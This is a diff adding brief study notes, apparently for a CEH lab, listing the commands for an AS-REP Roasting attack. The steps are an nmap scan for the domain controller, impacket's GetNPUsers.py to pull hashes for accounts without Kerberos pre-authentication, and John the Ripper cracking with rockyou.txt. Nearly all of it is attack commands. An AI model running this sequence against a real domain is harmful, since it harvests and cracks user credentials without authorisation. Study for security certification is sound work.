@@ -1,0 +1,19 @@
+impacket * Linux
+
+# UseCase [Used to perform AS-REP Roasting attack]
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+$ nmap -p 88 Target Subnet [To know the Domain Controller Ip] 
+
+$ cd /root/impacket/examples
+
+$ python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /path-to-user.txt -dc-ip Target IP  
+
+$ Copy the hash (full hash) and save the file as Josha.txt
+
+$ john --wordlist=/root/ADtools/rockyou.txt Josha.txt 
+
+$ john --show Josha.txt 
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
